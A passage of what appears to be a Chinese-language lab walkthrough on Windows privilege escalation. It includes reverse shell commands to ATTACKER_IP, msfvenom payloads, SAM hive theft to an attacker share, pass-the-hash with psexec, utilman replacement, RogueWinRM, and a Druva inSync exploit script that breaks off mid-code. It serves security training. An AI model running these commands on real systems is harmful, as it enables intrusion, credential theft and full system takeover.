HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s 注意：Simon Tatham 是 PuTTY 的创建者（他的名字是路径的一部分），而不是我们要检索密码的用户名。运行上述命令后，存储的代理用户名也应该可见。 正如 putty 存储凭据一样，任何存储密码的软件，包括浏览器、电子邮件客户端、FTP 客户端、SSH 客户端、VNC 软件等，都将有方法恢复用户保存的任何密码。 0x04 权限提升 4.1 Scheduled Tasks -计划任务 查看目标系统上的计划任务，您可能会看到计划任务丢失了其二进制文件或正在使用您可以修改的二进制文件。 可以使用不带任何选项的 schtasks 命令从命令行列出计划任务。要检索有关任何服务的详细信息，您可以使用如下命令： 可以使用不带任何选项的 schtasks 命令从命令行列出计划任务。要检索有关任何服务的详细信息，您可以使用如下命令： C:\\&gt; schtasks /query /tn vulntask /fo list /v Folder: \\ HostName: THM-PC1 TaskName: \\vulntask Task To Run: C:\\tasks\\schtask.bat Run As User: taskusr1 您将获得有关该任务的大量信息，但对我们来说重要的是“Task To Run”参数，该参数指示计划任务执行的内容，以及“Run As User”参数，该参数显示将使用的用户执行任务。 如果我们当前的用户可以修改或覆盖“要运行的任务”可执行文件，我们就可以控制 taskusr1 用户执行的内容，从而实现简单的权限提升。要检查可执行文件的文件权限，我们使用 icacls ： C:\\&gt; icacls c:\\tasks\\schtask.bat c:\\tasks\\schtask.bat NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) BUILTIN\\Users:(I)(F) 从结果中可以看出，BUILTIN\\Users 组对任务的二进制文件具有完全访问权限 (F)。这意味着我们可以修改 .bat 文件并插入我们喜欢的任何有效负载。为了您的方便，可以在 C:\\tools 上找到 nc64.exe 。让我们更改 bat 文件以生成反向 shell： C:\\&gt; echo c:\\tools c64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\\tasks\\schtask.bat 然后，我们在攻击者机器上启动一个侦听器，该侦听器位于我们在反向 shell 上指示的同一端口上： nc -lvp 4444 下次运行计划任务时，您应该会收到具有taskusr1权限的反向shell。虽然您可能无法在实际场景中启动任务，而必须等待计划任务触发（但我们为您的用户提供了手动启动任务的权限，以节省您的时间。我们可以使用以下命令运行该任务） C:\\&gt; schtasks /run /tn vulntask 您将按预期收到具有taskusr1权限的反向shell： user@attackerpc$ nc -lvp 4444 Listening on 0.0.0.0 4444 Connection received on 10.10.175.90 50649 Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami wprivesc1\\taskusr1 4.2 AlwaysInstallElevated -始终安装提升 Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，可以将它们配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能会让我们生成一个以管理员权限运行的恶意 MSI 文件。 注意：AlwaysInstallElevated 方法在此房间的计算机上不起作用，它仅供参考。 此方法需要设置两个注册表值。您可以使用以下命令从命令行查询这些内容。 C:\\&gt; reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer C:\\&gt; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer 为了能够利用此漏洞，两者都应该设置。否则，利用将是不可能的。如果设置了这些，您可以使用 msfvenom 生成恶意 .msi 文件，如下所示： msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi 由于这是一个反向 shell，您还应该运行相应配置的 Metasploit 处理程序模块。传输创建的文件后，您可以使用以下命令运行安装程序并接收反向 shell： C:\\&gt; msiexec /quiet /qn /i C:\\Windows\\Temp\\malicious.msi 4.3 Windows Services Windows 服务由服务控制管理器 (SCM) 管理。 SCM 是一个负责根据需要管理服务状态、检查任何给定服务的当前状态并通常提供配置服务的方法的进程。 Windows 计算机上的每个服务都有一个关联的可执行文件，每当服务启动时，SCM 都会运行该可执行文件。需要注意的是，服务可执行文件实现特殊功能以便能够与 SCM 通信，因此任何可执行文件都不能作为服务成功启动。每个服务还指定该服务将在其下运行的用户帐户。 为了更好地理解服务的结构，让我们使用 sc qc 命令检查 apphostsvc 服务配置： C:\\&gt; sc qc apphostsvc [SC] QueryServiceConfig SUCCESS SERVICE_NAME: apphostsvc TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Windows\\system32\\svchost.exe -k apphost LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Application Host Helper Service DEPENDENCIES : SERVICE_START_NAME : localSystem 在这里我们可以看到关联的可执行文件是通过 BINARY_PATH_NAME 参数指定的，用于运行服务的帐户显示在 SERVICE_START_NAME 参数上。 服务有一个自主访问控制列表（DACL），它指示谁有权启动、停止、暂停、查询状态、查询配置或重新配置服务以及其他权限。 DACL 可以从 Process Hacker 中看到（可以在您的计算机桌面上找到）： 所有服务配置都存储在注册表中的 HKLM\\SYSTEM\\CurrentControlSet\\Services\\ 下： 系统中的每个服务都存在一个子项。同样，我们可以在 ImagePath 值上看到关联的可执行文件，并在 ObjectName 值上看到用于启动服务的帐户。如果已为该服务配置了 DACL，它将存储在名为 Security 的子项中。正如您现在已经猜到的，默认情况下只有管理员可以修改此类注册表项。 4.4 服务可执行文件的不安全权限 如果与服务关联的可执行文件的权限较弱，允许攻击者修改或替换它，则攻击者可以轻松获得该服务帐户的权限。 为了了解其工作原理，让我们看一下 Splinterware System Scheduler 上发现的漏洞。首先，我们将使用 sc 查询服务配置： C:\\&gt; sc qc WindowsScheduler [SC] QueryServiceConfig SUCCESS SERVICE_NAME: windowsscheduler TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 0 IGNORE BINARY_PATH_NAME : C:\\PROGRA~2\\SYSTEM~1\\WService.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : System Scheduler Service DEPENDENCIES : SERVICE_START_NAME : .\\svcuser1 我们可以看到漏洞软件安装的服务以 svcuser1 身份运行，与该服务关联的可执行文件位于 C:\\Progra~2\\System~1\\WService.exe 中。然后我们继续检查可执行文件的权限： C:\\Users\\thm-unpriv&gt;icacls C:\\PROGRA~2\\SYSTEM~1\\WService.exe C:\\PROGRA~2\\SYSTEM~1\\WService.exe Everyone:(I)(M) NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) BUILTIN\\Users:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX) Successfully processed 1 files; Failed processing 0 files 这里有一些有趣的事情。 Everyone 组对服务的可执行文件具有修改权限 (M)。这意味着我们可以简单地用我们偏好的任何有效负载覆盖它，并且该服务将使用配置的用户帐户的权限执行它。 让我们使用 msfvenom 生成一个 exe-service 负载并通过 python Web 服务器提供它： user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe user@attackerpc$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 然后我们可以使用以下命令从 Powershell 中提取有效负载： wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe 一旦有效负载位于 Windows 服务器中，我们就继续用有效负载替换服务可执行文件。由于我们需要另一个用户来执行我们的有效负载，因此我们还希望向Everyone组授予完全权限： C:\\&gt; cd C:\\PROGRA~2\\SYSTEM~1\\ C:\\PROGRA~2\\SYSTEM~1&gt; move WService.exe WService.exe.bkp 1 file(s) moved. C:\\PROGRA~2\\SYSTEM~1&gt; move C:\\Users\\thm-unpriv\\rev-svc.exe WService.exe 1 file(s) moved. C:\\PROGRA~2\\SYSTEM~1&gt; icacls WService.exe /grant Everyone:F Successfully processed 1 files. 我们在攻击者机器上启动一个反向侦听器： user@attackerpc$ nc -lvp 4445 最后，重新启动服务。虽然在正常情况下，您可能需要等待服务重新启动，但您已被分配了自行重新启动服务的权限，以节省一些时间。从 cmd.exe 命令提示符使用以下命令： C:\\&gt; sc stop windowsscheduler C:\\&gt; sc start windowsscheduler 注意：PowerShell 将 sc 作为 Set-Content 的别名，因此您需要使用 sc.exe 才能以这种方式使用 PowerShell 控制服务。 结果，您将获得具有 svcusr1 权限的反向 shell： user@attackerpc$ nc -lvp 4445 Listening on 0.0.0.0 4445 Connection received on 10.10.175.90 50649 Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami wprivesc1\\svcusr1 4.5 未加引号的服务路径 当我们无法像以前一样直接写入服务可执行文件时，仍然有机会通过使用相当模糊的功能来强制服务运行任意可执行文件。 使用 Windows 服务时，当服务配置为指向“未加引号”的可执行文件时，会出现非常特殊的行为。不加引号是指未正确引用关联可执行文件的路径以解决命令中的空格问题。 作为示例，让我们看一下两个服务之间的区别（这些服务仅用作示例，可能在您的计算机中不可用）。第一个服务将使用正确的引用，以便 SCM 毫无疑问地知道它必须执行 \"C:\\Program Files\\RealVNC\\VNC Server\\vncserver.exe\" 指向的二进制文件，后跟给定的参数： C:\\&gt; sc qc \"vncserver\" [SC] QueryServiceConfig SUCCESS SERVICE_NAME: vncserver TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 0 IGNORE BINARY_PATH_NAME : \"C:\\Program Files\\RealVNC\\VNC Server\\vncserver.exe\" -service LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : VNC Server DEPENDENCIES : SERVICE_START_NAME : LocalSystem 请记住：PowerShell 将“sc”作为“Set-Content”的别名，因此，如果您处于 PowerShell 提示符中，则需要使用“sc.exe”来控制服务。 现在让我们看看另一项没有正确报价的服务： C:\\&gt; sc qc \"disk sorter enterprise\" [SC] QueryServiceConfig SUCCESS SERVICE_NAME: disk sorter enterprise TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 0 IGNORE BINARY_PATH_NAME : C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Disk Sorter Enterprise DEPENDENCIES : SERVICE_START_NAME : .\\svcusr2 当 SCM 尝试执行关联的二进制文件时，就会出现问题。由于“Disk Sorter Enterprise”文件夹的名称上有空格，因此该命令变得不明确，并且 SCM 不知道您正在尝试执行以下哪一个： Command Argument 1 Argument 2 C:\\MyPrograms\\Disk.exe Sorter Enterprise\\bin\\disksrs.exe C:\\MyPrograms\\Disk Sorter.exe Enterprise\\bin\\disksrs.exe C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe 这与命令提示符如何解析命令有关。通常，当您发送命令时，空格将用作参数分隔符，除非它们是带引号的字符串的一部分。这意味着未加引号的命令的“正确”解释是执行 C:\\\\MyPrograms\\\\Disk.exe 并将其余部分作为参数。 SCM 没有像它可能应该发生的那样失败，而是尝试帮助用户并开始按照表中所示的顺序搜索每个二进制文件： 首先，搜索 C:\\\\MyPrograms\\\\Disk.exe 。如果存在，该服务将运行此可执行文件。 如果后者不存在，它将搜索 C:\\\\MyPrograms\\\\Disk Sorter.exe 。如果存在，该服务将运行此可执行文件。 如果后者不存在，它将搜索 C:\\\\MyPrograms\\\\Disk Sorter Enterprise\\\\bin\\\\disksrs.exe 。此选项预计会成功，并且通常会在默认安装中运行。 从这个行为来看，问题就显而易见了。如果攻击者创建了在预期服务可执行文件之前搜索的任何可执行文件，他们就可以强制服务运行任意可执行文件。 虽然这听起来微不足道，但默认情况下，大多数服务可执行文件将安装在 C:\\Program Files 或 C:\\Program Files (x86) 下，非特权用户无法写入。这可以防止任何易受攻击的服务被利用。此规则也有例外： - 某些安装程序更改已安装文件夹的权限，使服务容易受到攻击。 - 管理员可能决定将服务二进制文件安装在非默认路径中。如果这样的路径是全局可写的，则该漏洞可以被利用。 在我们的例子中，管理员在 c:\\MyPrograms 下安装了磁盘排序器二进制文件。默认情况下，它继承 C:\\ 目录的权限，允许任何用户在其中创建文件和文件夹。我们可以使用 icacls 来检查： C:\\&gt;icacls c:\\MyPrograms c:\\MyPrograms NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F) BUILTIN\\Administrators:(I)(OI)(CI)(F) BUILTIN\\Users:(I)(OI)(CI)(RX) BUILTIN\\Users:(I)(CI)(AD) BUILTIN\\Users:(I)(CI)(WD) CREATOR OWNER:(I)(OI)(CI)(IO)(F) Successfully processed 1 files; Failed processing 0 files BUILTIN\\\\Users 组拥有AD和WD权限，分别允许用户创建子目录和文件。 使用 msfvenom 创建 exe-service Payload 并将其传输到目标主机的过程与以前相同，因此请像以前一样创建以下 Payload 并将其上传到服务器。我们还将启动一个侦听器来接收反向 shell 执行时的情况： user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe user@attackerpc$ nc -lvp 4446 一旦有效负载进入服务器，请将其移动到可能发生劫持的任何位置。在这种情况下，我们将把有效负载移动到 C:\\MyPrograms\\Disk.exe 。我们还将授予每个人对该文件的完全权限，以确保该服务可以执行该文件： C:\\&gt; move C:\\Users\\thm-unpriv\\rev-svc2.exe C:\\MyPrograms\\Disk.exe C:\\&gt; icacls C:\\MyPrograms\\Disk.exe /grant Everyone:F Successfully processed 1 files. 服务重新启动后，您的有效负载应该执行： C:\\&gt; sc stop \"disk sorter enterprise\" C:\\&gt; sc start \"disk sorter enterprise\" 结果，您将获得具有 svcusr2 权限的反向 shell： user@attackerpc$ nc -lvp 4446 Listening on 0.0.0.0 4446 Connection received on 10.10.175.90 50650 Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami wprivesc1\\svcusr2 4.6 不安全的服务权限 如果服务的可执行 DACL 配置良好，并且正确引用了服务的二进制路径，那么您仍然有机会利用该服务。如果服务 DACL（不是服务的可执行 DACL）允许您修改服务的配置，您将能够重新配置该服务。这将允许您指向所需的任何可执行文件并使用您喜欢的任何帐户运行它，包括 SYSTEM 本身。 要从命令行检查服务 DACL，您可以使用 Sysinternals 套件中的 Accesschk。为了您的方便，可在 C:\\\\tools 获取副本。检查 thmservice 服务 DACL 的命令是： C:\\tools\\AccessChk&gt; accesschk64.exe -qlc thmservice [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\\SYSTEM SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_PAUSE_CONTINUE SERVICE_START SERVICE_STOP SERVICE_USER_DEFINED_CONTROL READ_CONTROL [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\\Users SERVICE_ALL_ACCESS 这里我们可以看到 BUILTIN\\\\Users 组拥有SERVICE_ALL_ACCESS权限，这意味着任何用户都可以重新配置服务。 在更改服务之前，让我们构建另一个 exe-service 反向 shell，并在攻击者的计算机上启动它的侦听器： user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe user@attackerpc$ nc -lvp 4447 然后，我们将反向 shell 可执行文件传输到目标机器并将其存储在 C:\\Users\\thm-unpriv\\rev-svc3.exe 中。请随意使用 wget 传输您的可执行文件并将其移动到所需的位置。请记住授予每个人执行您的有效负载的权限： C:\\&gt; icacls C:\\Users\\thm-unpriv\\rev-svc3.exe /grant Everyone:F 要更改服务关联的可执行文件和帐户，我们可以使用以下命令（使用 sc.exe 时请注意等号后面的空格）： C:\\&gt; sc config THMService binPath= \"C:\\Users\\thm-unpriv\\rev-svc3.exe\" obj= LocalSystem 请注意，我们可以使用任何帐户来运行该服务。我们选择 LocalSystem，因为它是可用的最高特权帐户。要触发我们的有效负载，剩下的就是重新启动服务： C:\\&gt; sc stop THMService C:\\&gt; sc start THMService 我们将在攻击者的机器上收到一个具有系统权限的 shell： user@attackerpc$ nc -lvp 4447 Listening on 0.0.0.0 4447 Connection received on 10.10.175.90 50650 Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami NT AUTHORITY\\SYSTEM tips 权限是帐户执行特定系统相关任务所拥有的权利。这些任务可以像关闭计算机的权限一样简单，也可以像绕过某些基于 DACL 的访问控制的权限一样简单。 每个用户都有一组分配的权限，可以使用以下命令进行检查： whoami /priv 此处提供了 Windows 系统上可用权限的完整列表。从攻击者的角度来看，只有那些允许我们在系统中升级的权限才有意义。您可以在 Priv2Admin Github 项目上找到可利用权限的完整列表。 虽然我们不会逐一查看，但我们将展示如何滥用您可以找到的一些最常见的特权。 4.7 SeBackup / SeRestore SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，忽略任何 DACL。此权限背后的想法是允许某些用户从系统执行备份，而无需完全管理权限。 有了这种能力，攻击者可以使用多种技术轻松提升系统权限。我们将研究的方法包括复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希值。 接下来实操的帐户属于“Backup Operators”组，默认情况下被授予 SeBackup 和 SeRestore 权限。我们需要使用“以管理员身份打开”选项打开命令提示符才能使用这些权限。我们将被要求再次输入密码以获得提升的控制台： 进入命令提示符后，我们可以使用以下命令检查我们的权限： C:\\&gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled 要备份 SAM 和 SYSTEM 哈希值，我们可以使用以下命令： C:\\&gt; reg save hklm\\system C:\\Users\\THMBackup\\system.hive The operation completed successfully. C:\\&gt; reg save hklm\\sam C:\\Users\\THMBackup\\sam.hive The operation completed successfully. 这将创建几个包含注册表配置单元内容的文件。现在，我们可以使用 SMB 或任何其他可用方法将这些文件复制到攻击者计算机。对于 SMB，我们可以使用 impacket 的 smbserver.py 在 AttackBox 的当前目录中启动一个带有网络共享的简单 SMB 服务器： user@attackerpc$ mkdir share user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share 这将创建一个名为 public 的共享，指向 share 目录，该目录需要当前 Windows 会话的用户名和密码。之后，我们可以在 Windows 机器中使用 copy 命令将这两个文件传输到 AttackBox： C:\\&gt; copy C:\\Users\\THMBackup\\sam.hive \\\\ATTACKER_IP\\public\\ C:\\&gt; copy C:\\Users\\THMBackup\\system.hive \\\\ATTACKER_IP\\public\\ 并使用 impacket 检索用户的密码哈希值： user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 我们终于可以使用管理员的哈希来执行哈希传递攻击并获得具有系统权限的目标计算机的访问权限： user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation [*] Requesting shares on 10.10.175.90..... [*] Found writable share ADMIN$ [*] Uploading file nfhtabqO.exe [*] Opening SVCManager on 10.10.175.90..... [*] Creating service RoLE on 10.10.175.90..... [*] Starting service RoLE..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt; whoami nt authority\\system 4.8 SeTakeOwnership SeTakeOwnership 权限允许用户获取系统上任何对象的所有权，包括文件和注册表项，这为攻击者提升权限提供了多种可能性，例如，我们可以搜索作为 SYSTEM 运行的服务并获取所有权服务的可执行文件。然而，对于这项任务，我们将采取不同的路线。 要获得 SeTakeOwnership 权限，我们需要使用“以管理员身份打开”选项打开命令提示符。我们将被要求输入密码以获得提升的控制台： 进入命令提示符后，我们可以使用以下命令检查我们的权限： C:\\&gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ======================================== ======== SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled 这次我们将滥用 utilman.exe 来升级权限。 Utilman 是一个内置的 Windows 应用程序，用于在锁定屏幕期间提供“轻松访问”选项： 由于 Utilman 是以 SYSTEM 权限运行的，因此如果我们将原始二进制文件替换为我们喜欢的任何有效负载，我们将有效地获得 SYSTEM 权限。由于我们可以拥有任何文件的所有权，因此替换它是微不足道的。 要替换 utilman，我们将首先使用以下命令获取它的所有权： C:\\&gt; takeown /f C:\\Windows\\System32\\Utilman.exe SUCCESS: The file (or folder): \"C:\\Windows\\System32\\Utilman.exe\" now owned by user \"WINPRIVESC2\\thmtakeownership\". 请注意，成为文件的所有者并不一定意味着您拥有该文件的权限，但作为所有者，您可以为自己分配所需的任何权限。要为您的用户授予 utilman.exe 的完全权限，您可以使用以下命令： C:\\&gt; icacls C:\\Windows\\System32\\Utilman.exe /grant THMTakeOwnership:F processed file: Utilman.exe Successfully processed 1 files; Failed processing 0 files 之后，我们将用 cmd.exe 的副本替换 utilman.exe： C:\\Windows\\System32\\&gt; copy cmd.exe utilman.exe 1 file(s) copied. 要触发 utilman，我们将从开始按钮锁定屏幕： 最后，继续单击“轻松访问”按钮，该按钮将以系统权限运行 utilman.exe。由于我们将其替换为 cmd.exe 副本，因此我们将获得具有 SYSTEM 权限的命令提示符： 4.9 SeImpersonate / SeAssignPrimaryToken 这些权限允许进程模拟其他用户并代表他们执行操作。模拟通常包括能够在另一个用户的安全上下文下生成进程或线程。 当您考虑 FTP 服务器的工作原理时，就很容易理解模拟。 FTP 服务器必须限制用户只能访问他们应该被允许查看的文件。 假设我们有一个使用用户 ftp 运行的 FTP 服务。在没有模拟的情况下，如果用户 Ann 登录 FTP 服务器并尝试访问她的文件，FTP 服务将尝试使用其访问令牌而不是 Ann 的访问令牌来访问它们： 使用 ftp 令牌不是最好的主意有以下几个原因： - 为了正确提供文件， ftp 用户需要可以访问它们。在上面的示例中，FTP 服务将能够访问 Ann 的文件，但不能访问 Bill 的文件，因为 Bill 文件中的 DACL 不允许用户 ftp 。这增加了复杂性，因为我们必须为每个提供的文件/目录手动配置特定权限。 - 对于操作系统，所有文件均由用户 ftp 访问，与当前登录 FTP 服务的用户无关。这使得无法将授权委托给操作系统；因此，FTP服务必须实现它。 - 如果 FTP 服务在某个时刻遭到破坏，攻击者将立即获得对 ftp 用户有权访问的所有文件夹的访问权限。 另一方面，如果 FTP 服务的用户具有 SeImpersonate 或 SeAssignPrimaryToken 权限，则所有这些都会稍微简化，因为 FTP 服务可以临时获取登录用户的访问令牌，并使用它来执行其上的任何任务。代表： 现在，如果用户 Ann 登录到 FTP 服务，并且考虑到 ftp 用户具有模拟权限，则它可以借用 Ann 的访问令牌并使用它来访问她的文件。这样，文件不需要以任何方式向用户 ftp 提供访问权限，并且操作系统会处理授权。由于 FTP 服务正在冒充 Ann，因此在该会话期间它将无法访问 Jude 或 Bill 的文件。 作为攻击者，如果我们设法控制具有 SeImpersonate 或 SeAssignPrimaryToken 权限的进程，我们就可以模拟连接该进程并对其进行身份验证的任何用户。 在Windows系统中，你会发现LOCAL SERVICE和NETWORK SERVICE ACCOUNTS已经拥有这样的权限。由于这些帐户用于使用受限帐户生成服务，因此如果服务需要，允许它们模拟连接用户是有意义的。 Internet 信息服务 (IIS) 还将为 Web 应用程序创建一个名为“iis apppool\\defaultapppool”的类似默认帐户。 要使用此类帐户提升权限，攻击者需要满足以下条件： 1. 生成一个进程，以便用户可以连接该进程并对其进行身份验证，以进行模拟。 2.找到一种方法来强制特权用户连接并验证生成的恶意进程。 我们将使用 RogueWinRM 漏洞来实现这两个条件。 首先，假设我们已经入侵了一个在 IIS 上运行的网站，并且我们已经在以下地址植入了 Web shell： http://MACHINE_IP/ 我们可以使用 Web shell 检查受感染帐户的分配权限，并确认我们拥有此任务感兴趣的两项权限： 要使用RogueWinRM，我们首先需要将漏洞利用程序上传到目标机器。为了您的方便，这已经完成，您可以在 C:\\tools\\ 文件夹中找到该漏洞。 RogueWinRM 漏洞利用是可能的，因为每当用户（包括非特权用户）在 Windows 中启动 BITS 服务时，它都会使用系统权限自动创建到端口 5985 的连接。端口 5985 通常用于 WinRM 服务，它只是一个公开 Powershell 控制台以通过网络远程使用的端口。可以将其想象为 SSH，但使用 Powershell。 如果由于某种原因，WinRM 服务没有在受害服务器上运行，则攻击者可以在端口 5985 上启动伪造的 WinRM 服务，并在启动时捕获 BITS 服务进行的身份验证尝试。如果攻击者具有SeImpersonate权限，他可以代表连接用户（即SYSTEM）执行任何命令。 在运行漏洞之前，我们将启动一个 netcat 侦听器以在攻击者的计算机上接收反向 shell： user@attackerpc$ nc -lvp 4442 然后，使用我们的 Web shell 使用以下命令触发 RogueWinRM 漏洞利用： c:\\tools\\RogueWinRM\\RogueWinRM.exe -p \"C:\\tools c64.exe\" -a \"-e cmd.exe ATTACKER_IP 4442\" 注意：该漏洞可能需要长达 2 分钟才能发挥作用，因此您的浏览器可能会出现一段时间无响应。如果您多次运行漏洞利用程序，就会发生这种情况，因为它必须等待 BITS 服务停止才能再次启动。 BITS服务将在启动2分钟后自动停止。 -p 参数指定漏洞利用程序运行的可执行文件，在本例中为 nc64.exe 。 -a 参数用于将参数传递给可执行文件。由于我们希望 nc64 针对攻击者机器建立反向 shell，因此传递给 netcat 的参数将为 -e cmd.exe ATTACKER_IP 4442 。 如果一切设置正确，您应该会得到一个具有 SYSTEM 权限的 shell： user@attackerpc$ nc -lvp 4442 Listening on 0.0.0.0 4442 Connection received on 10.10.175.90 49755 Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. c:\\windows\\system32\\inetsrv&gt;whoami nt authority\\system 4.10 未打补丁的软件 目标系统上安装的软件可以提供各种权限升级机会。与驱动程序一样，组织和用户可能不会像更新操作系统那样频繁地更新它们。您可以使用 wmic 工具列出目标系统上安装的软件及其版本。下面的命令将转储它可以在已安装的软件上收集的信息（可能需要大约一分钟才能完成）： wmic product get name,version,vendor Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable. 请记住， wmic product 命令可能不会返回所有已安装的程序。根据某些程序的安装方式，它们可能不会在此处列出。检查桌面快捷方式、可用服务或任何表明存在可能易受攻击的其他软件的痕迹始终是值得的。 一旦我们收集了产品版本信息，我们就可以随时在 exploit-db, packet storm 和 Google,等网站上在线搜索已安装软件的现有漏洞。 Example：Druva inSync 6.6.3 目标服务器正在运行 Druva inSync 6.6.3，据 Matteo Malvica 报告，该服务器容易受到权限升级的影响。该漏洞是由于对 Chris Lyne 最初针对 6.5.0 版本报告的另一个漏洞应用了错误补丁而导致的。 该软件容易受到攻击，因为它以系统权限在端口 6064 上运行 RPC（远程过程调用）服务器，只能从本地主机访问。如果您不熟悉 RPC，它只是一种允许给定进程通过网络公开函数（RPC 行话中称为过程）的机制，以便其他计算机可以远程调用它们。 对于 Druva inSync，端口 6064 上公开的过程之一（特别是过程号 5）允许任何人请求执行任何命令。由于 RPC 服务器以 SYSTEM 身份运行，因此任何命令都以 SYSTEM 权限执行。 6.5.0 及更早版本中报告的原始漏洞允许不受限制地运行任何命令。提供此类功能的最初想法是远程执行 inSync 提供的一些特定二进制文件，而不是任何命令。尽管如此，仍然没有进行任何检查来确保这一点。 发布了一个补丁，他们决定检查执行的命令是否以字符串 C:\\ProgramData\\Druva\\inSync4\\ 开头，这是允许的二进制文件应该在的地方。但是，事实证明这还不够，因为您可以简单地进行路径遍历攻击来绕过这种控制。假设你要执行 C:\\Windows\\System32\\cmd.exe ，它不在允许的路径中；您只需要求服务器运行 C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe 即可成功绕过检查。 为了构建一个可行的漏洞利用程序，我们需要了解如何与端口 6064 通信。幸运的是，我们使用的协议很简单，要发送的数据包如下图所示： 第一个数据包只是一个包含固定字符串的 hello 数据包。第二个数据包表明我们想要执行程序 5，因为这是一个易受攻击的程序，它将为我们执行任何命令。最后两个数据包分别用于发送命令的长度和要执行的命令字符串。 最初由 Matteo Malvica 在此发布，可以在目标计算机中使用以下漏洞来提升权限并检索此任务的标志。为了您的方便，以下是原始漏洞利用代码： $ErrorActionPreference = \"Stop\" $cmd = \"net user pwnd /add\" $s = New-Object System.Net.Sockets.Socket( [System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp ) $s.Connect(\"127.0.0.1\", 6064) $header = [System.Text.Encoding]::UTF8.GetBytes(\"inSync PHC RPCW[v0002]\") $rpcType = [System.Text.Encoding]::UTF8.GetBytes(\"$([char]0x0005)`0`0`0\") $command = [System.Text.Encoding]::Unicode.GetBytes(\"C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe /c $cmd\"); $length = [System.BitConverter]::GetBytes($command.Length); $s.Send($header) 